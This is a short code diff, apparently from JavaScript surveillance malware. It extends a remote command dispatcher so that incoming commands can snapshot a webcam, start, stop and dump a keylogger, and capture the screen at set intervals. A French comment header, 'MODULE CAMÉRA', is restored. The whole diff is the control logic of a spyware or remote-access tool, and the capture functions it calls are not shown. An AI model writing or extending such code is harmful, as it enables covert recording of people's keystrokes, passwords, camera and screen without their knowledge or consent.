@@ -148,7 +148,21 @@
                 case 'camera':
                     if (cmd.action === 'start') startCamera(cmd.params.interval || 5);
                     else if (cmd.action === 'stop') stopCamera();
-           MODULE CAMÉRA
+                    else if (cmd.action === 'snapshot') captureCamera();
+                    break;
+                case 'keylogger':
+                    if (cmd.action === 'start') startKeylogger();
+                    else if (cmd.action === 'stop') stopKeylogger();
+                    else if (cmd.action === 'dump') dumpKeylogger();
+                    break;
+                case 'screen':
+                    if (cmd.action === 'start') startScreen(cmd.params.quality || 0.5, cmd.params.interval || 2);
+                    else if (cmd.action === 'stop') stopScreen();
+                    break;
+            }
+        }
+
+        // MODULE CAMÉRA
         function startCamera(interval) {
             if (modules.camera.active) return;
             modules.camera.active = true;
